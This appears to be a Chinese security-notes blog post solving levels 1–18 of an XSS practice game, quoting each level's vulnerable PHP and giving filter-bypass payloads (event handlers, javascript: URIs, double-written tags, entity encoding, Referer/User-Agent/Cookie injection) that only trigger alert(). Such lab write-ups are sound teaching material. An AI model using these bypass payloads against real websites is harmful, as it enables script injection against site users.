---
title: security-5 xss小游戏
date: 2019-05-03 21:06:59
categories: 网络安全笔记
---
# 说明
- xss小游戏答案与解析 针对level 1-18
- 有的html实体编码我用单引号如java'&''#'115;cript:alert()
<!--more-->

# level-1
- 这道题很简单直接在url上输入payload

```
&#60;script>alert(1)&#60;/script>
```

- 源代码分析

```
$str = $_GET["name"];
echo "&#60;h2 align=center>欢迎用户".$str."&#60;/h2>";
```
- 发现源代码，对url输入的参数没有任何过滤

# level-2
- 输入level-1的payload，可以看出对url的参数转译成HTML实体
- 查看源码

```
$str = $_GET["keyword"];
echo "&#60;h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'&#60;center>
&#60;form action=level2.php method=GET>
&#60;input name=keyword  value="'.$str.'"> //没有实体化
&#60;input type=submit name=submit value="搜索"/> 
&#60;/form>
```
- htmlspecialchars() 
函数把预定义的字符转换为 HTML 实体
- 但是发现在form表单输出并没有实体化，可以在表单输入如下payload

```
1">&#60script>alert(1)&#60/script>//
```
- 也可以在url输入如下payload

```
"onclick="window.alert()
```
- 点击表单，就会弹出弹窗

# level-3
- 直接看源码

```
$str = $_GET["keyword"];
echo "&#60h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."
&#60form action=level3.php method=GET>
&#60input name=keyword  value='".htmlspecialchars($str)."'>
&#60input type=submit name=submit value=搜索 />
&#60/form>

```
- 发现表单输出也实体化了，payload如下：

```
'onclick='window.alert()
```
- htmlspecialchars转译双引号，但不转义单引号，这里程序还有个小bug，url输入没反应，理论上应该也可以成功

# level-4 
- 还是直接看源码

```
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "&#60h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'
&#60form action=level4.php method=GET>
&#60input name=keyword  value="'.$str3.'">
&#60input type=submit name=submit value=搜索 />
&#60/form>
```
- str_replace()
把字符串 "Hello world!" 中的字符 "world" 替换为 "Shanghai"：

```
&#60?php
echo str_replace("world","Shanghai","Hello world!");
?>
```
- 可以看出url，form输入的参数，"<",">",分别被替换为","
- payload：

```
"onclick="window.alert()
```
# level-5
- 源码

```
$str = strtolower($_GET["keyword"]);
$str2=str_replace("&#60script","&#60scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "&#60h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'
&#60form action=level5.php method=GET>
&#60input name=keyword  value="'.$str3.'">
&#60input type=submit name=submit value=搜索 />
&#60/form>
```

- 可以看到&#60script>被替换成&#60scr_ipt>,on被替换成o_n，onclick点击事件不能用了
- 大写可以吗？当然不可以因为
- strtolower
把所有字符转换为小写
- 但是可以用如下payload

```
">&#60a href="javascript:alert('a')">1&#60/a>//
```
- 记得要闭合前面的括号，也注释掉后面的js语句

# level-6
- 查看源码

```
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "&#60h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'
&#60form action=level6.php method=GET>
&#60input name=keyword  value="'.$str6.'">
&#60input type=submit name=submit value=搜索 />
&#60/form>

```
- 可以看出，on->o_n,src->sr_c,data->da_ta,href->hr_ef
- 但是这时候没有strtolower函数，可以用如下payload

```
1 ">&#60a HREF="javascript:alert('a')">1&#60/a>//
```

# level-7
- 查看源代码

```
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "&#60h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.&#60/h2>".'
&#60form action=level7.php method=GET>
&#60input name=keyword  value="'.$str6.'">
&#60input type=submit name=submit value=搜索 />
&#60/form>
```

- 大写转为小写，script等字符转化为空，但是双写就可以绕过
- payload

```
">&#60scrscriptipt>alert(1)&#60/scrscriptipt>//
```
# level-8
- 源码

```
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '
&#60form action=level8.php method=GET>
&#60input name=keyword  value="'.htmlspecialchars($str).'">
&#60input type=submit name=submit value=添加友情链接 />
</form>
&#60?php
 echo '&#60BR>&#60a href="'.$str7.'">友情链接</a>';
?>
```
- 这道题有点难，这时候可以转化编码
- payload如下：

```
s转化位unicode编码：
java‘&’‘#’115;cript:alert()
c,r,i,p,t都可转化成base64编码
```
# level-9 
- 源码

```
if(false===strpos($str7,'http://'))
{
  echo '&#60BR>&#60a href="您的链接不合法？有没有！">友情链接&#60/a>';
        }
else
{
  echo '&#60BR>&#60a href="'.$str7.'">友情链接</a>';
}

```
- 可以发现，和level-8的区别是友情链接多了一个判断
- strpos

查找 "php" 在字符串中第一次出现的位置：
返回值： 	
返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。
注释：字符串位置从 0 开始，不是从 1 开始。
```
&#60?php
echo strpos("You love php, I love php too!","php");
?>
```
- 就是说你在表单填的信息，必须是http的链接，不是的话就认为是有恶意代码，报错
- 我们可以加http注释，不发挥作用
- payload

```
javascri'&'#'x0070;t:alert(1)/*http://www.baidu.com*/
```

# level-10
- 源码

```
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "&#60h2>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'
&#60form id=search>
&#60input name="t_link"  value="'.'" type="hidden">
&#60input name="t_history"  value="'.'" type="hidden">
&#60input name="t_sort"  value="'.$str33.'" type="hidden">
&#60/form>
```
- keyword参数没什么作用，看到3个input标签，属性都是hidden，很懵。但是目标很明确，让任意一个hidden，变成text，就可以成功。但是参数只有从t_sort中获取，因此
- payload

```
&t_sort="onclick="alert()"type="text"
```
- &逻辑语句，

```
链接两个语句，与and同义
```

# level-11
- 源码

```
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "&#60h2>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'
&#60form id=search>
&#60input name="t_link"  value="'.'" type="hidden">
&#60input name="t_history"  value="'.'" type="hidden">
&#60input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
&#60input name="t_ref"  value="'.$str33.'" type="hidden">

```
- 分析源码可以看到$str11=$_SERVER['HTTP_REFERER'];，他接收了上一题的referer。
- 用level-10完成之前，抓包，然后将referer改成如下payload即可完成
- payload

```
Referer:t_sort="type="text" onclick="alert(1)
```
# level-12
- 其他的和上一题基本相似，接收了上一题的user-agent，源码

```
$str11=$_SERVER['HTTP_USER_AGENT'];
```
- 在level-11完成之前用brup抓包，将user-agent参数改成如下payload
- payload

```
User-Agent:t_sort="type="text" onclick="alert(1)
```

# level-13
- 接收了上一题的cookie源码

```
$str11=$_COOKIE["user"]; //获取cookie的user值
```
- 在level-12完成之前用brup抓包，将cookie参数改成如下payload
- payload

```
Cookie:user=t_sort="type="text" onclick="alert(1);
```

# level-14
- 利用exiftool改变图片的exif信息
- 上传一个含有xss代码的图片触发xss
- 因为要用到乌云信息，
参考先知社区链接：
https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12

# level-15
- 看源码

```
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '&#60body>&#60span class="ng-include:'.htmlspecialchars($str).'">&#60/span>
```
- AngularJS ng-include 指令

ng-include 指令用于包含外部的 HTML 文件。
包含的内容将作为指定元素的子节点。
ng-include 属性的值可以是一个表达式，返回一个文件名。
默认情况下，包含的文件需要包含在同一个域名下

- 因此调用level-1的代码payload

```
/level15.php?src='level1.php?name=test&#60img src=1 onerror=alert(1)>'
```
# level-16
- 看源码

```
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str); 
$str3=str_replace(" ","&nbsp;",$str2); 
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("     ","&nbsp;",$str4);
echo .$str5.;
&#60img src=level16.png>
&#60?php
echo "&#60h3 align=center>payload的长度:".strlen($str5)."&#60/h3>";
```

- 分析源码可知，script，/，空格都转译了
- 用img标签，%0d或者%0a作为分隔符代替空格，paylaod如下

```
?keyword=test&#60img%0dsrc=1%0donerror=alert(1)> 
```

# level-17
- 源码

```
echo "&#60embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";

```
- &#60embed> 标签定义嵌入的内容，比如插件。
- 火狐浏览器不显示，我用谷歌可以成功
- payload

```
?arg01=a&arg02= onmouseover=alert(1)
```

- 理论上onclick也可以成功，但是直接，就跳转到错误界面了，没来得及显
- onmouseup 事件触发后，再触发 onclick 事件

# level-18
- 源码

```
"&#60?php
ini_set("display_errors", 0);
echo ""&#60embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
```
- 分析源码和level-17没什么差异
- payload

```
?arg01=a&arg02=b%20onmouseout=alert(1)
```
